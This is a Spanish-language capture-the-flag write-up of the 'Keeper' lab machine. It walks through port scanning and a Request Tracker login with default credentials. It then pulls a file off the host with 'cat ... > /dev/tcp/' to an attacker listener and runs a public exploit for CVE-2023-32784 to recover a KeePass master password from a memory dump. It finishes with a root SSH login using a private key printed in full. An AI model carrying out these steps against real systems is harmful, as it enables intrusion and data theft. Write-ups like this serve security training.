---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Keeper

Keeper es una máquina Linux de nivel de dificultad fácil que cuenta con un sistema de tickets de soporte que utiliza credenciales predeterminadas. Al enumerar el servicio, podemos ver las credenciales de texto sin formato que conducen al acceso SSH. Con el acceso "SSH", podemos obtener acceso a un archivo de volcado de la base de datos de KeePass, que podemos aprovechar para recuperar la contraseña maestra. Con acceso a la base de datos "Keepass", podemos acceder a las claves "SSH" raíz, que se utilizan para obtener un shell privilegiado en el host.

<figure><img src="../../.gitbook/assets/Keeper.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Keeper**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.227 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 14:10 CET
Initiating SYN Stealth Scan at 14:10
Scanning 10.10.11.227 [65535 ports]
Discovered open port 80/tcp on 10.10.11.227
Discovered open port 22/tcp on 10.10.11.227
Completed SYN Stealth Scan at 14:11, 24.44s elapsed (65535 total ports)
Nmap scan report for 10.10.11.227
Host is up, received user-set (0.064s latency).
Scanned at 2025-01-26 14:10:48 CET for 24s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.60 seconds
           Raw packets sent: 67149 (2.955MB) | Rcvd: 67165 (2.688MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.227
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abiertos el servicio SSH y una página web de `Nginz`.

```bash
❯ nmap -sCV -p22,80 10.10.11.227 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 14:12 CET
Nmap scan report for keeper.htb (10.10.11.227)
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   60.68 ms 10.10.16.1
2   31.09 ms keeper.htb (10.10.11.227)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Access

### Using default credentials to Request Tracker access

Al acceder a http://10.10.11.227, se nos indica que para contactar con el soporte técnico, debemos dirigirnos a [http://tickets.keeper.htb/rt/](http://tickets.keeper.htb/rt/)

<figure><img src="../../.gitbook/assets/imagen (11) (1).png" alt=""><figcaption></figcaption></figure>

Añadiremos en nuestro archivo `/etc/hosts` las entradas correspondientes.

```bash
❯ cat /etc/hosts | grep 10.10.11.227
10.10.11.227 keeper.htb tickets.keeper.htb
```

Al acceder a[ http://tickets.keeper.htb/rt/](http://tickets.keeper.htb/rt/) nos encontramos con el siguiente panel de inicio de sesión en el cual podemos comprobar arriba a la derecha que se trata de un software llamado `Request Tracker`. Probamos las típicas contraseñas por defecto sin éxito.

<figure><img src="../../.gitbook/assets/4151_vmware_iR49KbNSGt.png" alt=""><figcaption></figcaption></figure>

Al realizar una búsqueda por Internet, nos encontramos cuales son las credenciales que utiliza esta aplicación por defecto.

<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Probamos de ingresar con las credenciales `root/password` y verificamos que logramos acceder sin problemas al panel de administración.

<figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Information Leakage

Al navegar por las diferentes opciones del sitio web, nos encontramos con una página en donde aparecen usuarios. Probaremos de acceder al usuario llamado `lnorgaard`.

<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verificamos que en el usuario en la sección de comentarios nos aparecen unas credenciales por defecto, probaremos si aún siguen siendo válidas para este usuario.&#x20;

Además, podemos comprobar que en el nombre real en la otra 'o' está puesta como otro carácter distinto. Por otro lado, en la sección de `Extra info` también notamos lo mismo en algunos carácteres, parece que está en otro idioma.

<figure><img src="../../.gitbook/assets/imagen (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Validaremos a través de `nxc`si las credenciales son válidas para conectarnos mediante SSH, comprobamos que podemos acceder y visualizar la flag de **user.txt**.

```bash
❯ nxc ssh 10.10.11.227 -u 'lnorgaard' -p 'Welcome2023!'
SSH         10.10.11.227    22     10.10.11.227     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3
SSH         10.10.11.227    22     10.10.11.227     [+] lnorgaard:Welcome2023!  Linux - Shell access!

❯ ssh lnorgaard@10.10.11.227
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ cat user.txt
fab90a2de***********************
```

## Privilege Escalation

### Transfer a file with /dev/tcp method

Revisando el directorio en el que nos encontramos, visualizamos un archivo llamado `RT30000.zip`.

```bash
lnorgaard@keeper:~$ ls -l
total 85348
-rw-r--r-- 1 root root      87391651 Jan 26 14:18 RT30000.zip
```

Nos pasaremos este archivo a nuestro equipo local para trabajar con él y comprobar el contenido de este. Para ello, desde nuestro equipo de atacnate nos pondremos en escucha con `nc` para recibir por el puerto `443` el archivo mencionado.

```bash
❯ nc -nlvp 443 > RT30000.zip
listening on [any] 443 ...
```

Desde el equipo víctima, enviaremos el contenido del `.zip` realizando un `cat` sobre el archivo y enviando el `output` al `/dev/tcp` de nuestra dirección y puerto donde estamos en escucha.

```bash
lnorgaard@keeper:~$ cat RT30000.zip > /dev/tcp/10.10.16.5/443
```

Verificaremos que hemos recibido correctamente el archivo original sin problemas. Descomprimiremos el archivo y visualiozaremos que nos encontramos con un archivo `.DMP` que se trata de un `Memory Dump` y también una base de datos de contraseñas de **KeepPass**.

```bash
❯ ls -l RT30000.zip
.rw-rw-r-- kali kali 83 MB Sun Jan 26 14:20:46 2025  RT30000.zip

❯ unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx
           
❯ tree
.
├── KeePassDumpFull.dmp
├── passcodes.kdbx
└── RT30000.zip

1 directory, 3 files
```

Abriremos el archivo `passcodes.kdbx` a través de `keepassxc` para visualizarlo en entorno gráfico.

```bash
❯ keepassxc passcodes.kdbx & disown
```

Verificamos que al acceder al archivo, nos pide credenciales de acceso y no podemos acceder a él sin proporcionarle ninguna.

<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Obtaining KeePass password through memory dump (CVE-2023-32784)

Por lo tanto, lo que pensamos es en recuperar el hash de la contraseña del archivo a través de `keepass2john` y posteriormente crackear el hash. En este caso, al parecer la contraseña no se encontraba dentro del diccionario del `rockyou.txt`.

<pre class="language-bash"><code class="lang-bash">❯ keepass2john passcodes.kdbx > hashes

❯ catnp hashes
passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
<strong>
</strong><strong>❯ john --wordlist:/usr/share/wordlists/rockyou.txt hashes
</strong>Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
</code></pre>

Revisamos el tipo de archivo que era, y nos percatamos que se trataba de un archivo de `Keepass password database 2.x`.

```bash
❯ file passcodes.kdbx
passcodes.kdbx: Keepass password database 2.x KDBX
```

Revisando posibiles vulnerabilidades sobre esta versión de **KeePass**, nos encontramos con el siguiente `CVE-2023-32784`.

{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-32784" %}

{% hint style="danger" %}
En KeePass v2.x anterior a v2.54, es posible recuperar la contraseña maestra en texto claro a partir de un volcado de memoria, incluso cuando un espacio de trabajo está bloqueado o ya no se ejecuta. El volcado de memoria puede ser un volcado de proceso de KeePass, un archivo de intercambio (pagefile.sys), un archivo de hibernación (hiberfil.sys) o un volcado de RAM de todo el sistema. El primer carácter no se puede recuperar. En la versión 2.54, hay un uso diferente de la API y/o inserción de una cadena aleatoria para la mitigación.
{% endhint %}

Nos descargamos el proyecto de GitHub para realizar la explotación de la vulnerabilidad, para verificar si funciona o no.

{% embed url="https://github.com/CMEPW/keepass-dump-masterkey" %}

```bash
❯ git clone https://github.com/CMEPW/keepass-dump-masterkey; cd keepass-dump-masterkey
Clonando en 'keepass-dump-masterkey'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 0), reused 6 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (9/9), 32.52 KiB | 951.00 KiB/s, listo.
```

Al ejecutar el exploit pasándole el archivo `KeePassDumpFull.dmp` que obtuvimos, nos encontramos que al parecer ha logrado obtener lo que parece ser la posible contraseña del archivo de KeePass.

En este caso, el resultado al parecer hay algunos carácteres que parecen no ser de `UTF-8` y por dicho motivo el script no lo interpreta.

```bash
❯ python3 poc.py ../KeePassDumpFull.dmp
2025-01-26 14:28:06,549 [.] [main] Opened ../KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

Al buscarpor internet, nos encontramos que el resultado obtenido en el paso anterior, parece ser que se trata del siguiente.

<figure><img src="../../.gitbook/assets/4159_vmware_oeAupdPFiI.png" alt=""><figcaption></figcaption></figure>

Probamos de acceder con lo que supuestamente parece ser la contraseña del **KeePass** pero tampoco logramos poder acceder a ella.

<figure><img src="../../.gitbook/assets/imagen (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

De casualidad, también probamos de revisar si poniendo la contaseña anterior en minúsculas nos funcionaría o no.

<figure><img src="../../.gitbook/assets/imagen (8) (1) (1).png" alt="" width="531"><figcaption></figcaption></figure>

Con la contraseña en minúsculas, logramos obtener acceso a la base de datos de **KeePass**. En el archivo, nos encontramos que hay una clave privada de PuTTY del usuario `root` y también una contraseña en texto plano.

<figure><img src="../../.gitbook/assets/imagen (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Validaremos si la contraseña en texto plano sirve para el usuario`root`. En este caso, las credenciales no son válidas.

```bash
❯ nxc ssh 10.10.11.227 -u 'root' -p 'F4><3K0nd!'
SSH         10.10.11.227    22     10.10.11.227     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3
SSH         10.10.11.227    22     10.10.11.227     [-] root:F4><3K0nd!
```

### Converting PPK Key V3 to SSH Private Key (id\_rsa)

Nos guardaremos en un archivo llamado `private_key` el contenido de la clave privada de `PuTTY` que nos encontramos en el **KeePass**. Revisando el tipo de archivo del que se trataba, nos encontramos que es un archivo `PuTTY Private Key File V3`.

```bash
❯ cat private_key
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

❯ file private_key
private_key: PuTTY Private Key File, version 3, algorithm ssh-rsa
```

Dado que esta clave privada de `PuTTY` no nos serviría para conectarnos al `SSH`, lo que buscamos por  Internet es maneras de convertir esta clave privada a una clave privada de SSH. Nos encontramos con el siguiebnte blog que nos mencionaba el proceso a realizar.

{% embed url="https://medium.com/@arslion/convert-ppk-version-3-to-ssh-private-public-keys-pem-on-linux-ubuntu-4bf2c8db1ef2" %}

A través de `puttygen` convertiremos la clave privada `PPK`que disponemos en una clave privada `SSH` (id\_rsa). Una vez convertida, le daremos los permisos necesarios y verificaremos que se ha convertido correctamente.

```bash
❯ puttygen private_key -O private-openssh -o id_rsa

❯ chmod 600 id_rsa

❯ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP
c9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPf
Tykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6n
FSftm50elK1FUQeLYZiXGtvSQKtqfQZHQxrIh/BfHmpyAQNU7hVW1Ldgnp0lDw1A
MO8CC+eqgtvMOqv6oZtixjsV7qevizo8RjTbQNsyd/D9RU32UC8RVU1lCk/LvI7p
5y5NJH5zOPmyfIOzFy6m67bIK+csBegnMbNBLQIDAQABAoIBAQCB0dgBvETt8/UF
NdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6joDni1wZdo7hTpJ5Zjdmz
wxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCihkmyZTZOV9eq1D6P1uB6A
XSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputYf7n24kvL0WlBQThsiLkK
cz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzTVkCew1DZuYnYOGQxHYW6
WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivzUXjcCAviPpmSXB19UG8J
lTpgORyhAoGBAPaR+FID78BKtzThkhVqAKB7VCryJaw7Ebx6gIxbwOGFu8vpgoB8
S+PfF5qFd7GVXBQ5wNc7tOLRBJXaxTDsTvVy+X8TEbOKfqrKndHjIBpXs+Iy0tOA
GSqzgADetwlmklvTUBkHxMEr3VAhkY6zCLf+5ishnWtKwY3UVsr+Z4f1AoGBAK28
/Glmp7Kj7RPumHvDatxtkdT2Iaecl6cYhPPS/OzSFdPcoEOwHnPgtuEzspIsMj2j
gZZjHvjcmsbLP4HO6PU5xzTxSeYkcol2oE+BNlhBGsR4b9Tw3UqxPLQfVfKMdZMQ
a8QL2CGYHHh0Ra8D6xfNtz3jViwtgTcBCHdBu+lZAoGAcj4NvQpf4kt7+T9ubQeR
RMn/pGpPdC5mOFrWBrJYeuV4rrEBq0Br9SefixO98oTOhfyAUfkzBUhtBHW5mcJT
jzv3R55xPCu2JrH8T4wZirsJ+IstzZrzjipe64hFbFCfDXaqDP7hddM6Fm+HPoPL
TV0IDgHkKxsW9PzmPeWD2KUCgYAt2VTHP/b7drUm8G0/JAf8WdIFYFrrT7DZwOe9
LK3glWR7P5rvofe3XtMERU9XseAkUhTtqgTPafBSi+qbiA4EQRYoC5ET8gRj8HFH
6fJ8gdndhWcFy/aqMnGxmx9kXdrdT5UQ7ItB+lFxHEYTdLZC1uAHrgncqLmT2Wrx
heBgKQKBgFViaJLLoCTqL7QNuwWpnezUT7yGuHbDGkHl3JFYdff0xfKGTA7iaIhs
qun2gwBfWeznoZaNULe6Khq/HFS2zk/Gi6qm3GsfZ0ihOu5+yOc636Bspy82JHd3
BE5xsjTZIzI66HH5sX5L7ie7JhBTIO2csFuwgVihqM4M+u7Ss/SL
-----END RSA PRIVATE KEY-----
```

Trataremos de acceder al SSH a través de esta clave privada del usuario `root` y comprobamos que hemos podido conectarnos al equipo. También logramos visualizar la flag de **root.txt**.

```bash
❯ ssh -i id_rsa root@10.10.11.227
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# cat root.txt
b2970ee7*************************
```
